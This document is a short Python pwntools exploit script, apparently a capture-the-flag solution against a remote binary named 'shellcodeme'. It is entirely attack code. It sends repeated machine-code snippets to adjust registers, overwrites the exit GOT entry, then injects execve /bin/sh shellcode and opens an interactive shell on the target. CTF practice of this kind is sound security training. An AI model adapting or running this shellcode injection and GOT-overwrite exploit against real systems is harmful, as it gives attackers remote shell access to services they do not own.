from pwn import *
 
#r = process("./shellcodeme")
r = remote("shellcodeme.420blaze.in", 420)
#gdb.attach(r, '''
#break *0x40072d
#''')
exitgot = 0x601018
r12initial = 0x400740
movr14r12 = "\x4d\x89\xe6"
jmpback = "\x49\x81\xc4\x5b\xff\xff\xff"
jmpr12 = "\x41\xff\xe4"
subr12e0 = "\x49\x83\xec\xe0"
ret = jmpback + jmpr12
print r.recvuntil("?")
 
r.sendline(jmpback + jmpr12)
 
print r.recvuntil("?")
r.sendline(movr14r12 + jmpr12)
 
 
for i in range((exitgot - 0x40069b) / 0xffff):
    r.recvuntil("?")
    r.sendline("\x49\x81\xc6\xff\xff\x00\x00" + jmpr12)
for i in range(9):
    r.recvuntil("?")
    r.sendline("\x49\x81\xc6\xff\x00\x00\x00" + jmpr12)
 
for i in range(166):
    r.recvuntil("?")
    r.sendline("\x49\xff\xc6" + jmpr12)
#gdb,attach(r, '''break *0x40072d''')
print r.recvuntil("?")
r.sendline("\x4d\x89\xe7" + jmpr12)
 
for i in range(0x40072d - 0x40069b):
    r.recvuntil("?")
    r.sendline("\x49\xff\xc7" + jmpr12)
 
#gdb.attach(r, '''break *0x40072d''')
 
print r.recvuntil("?")
r.sendline("\x4d\x89\x3e" + jmpr12)
#gdb.attach(r)
 
print r.recvuntil("?")
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
r.sendline(shellcode)  
r.interactive()
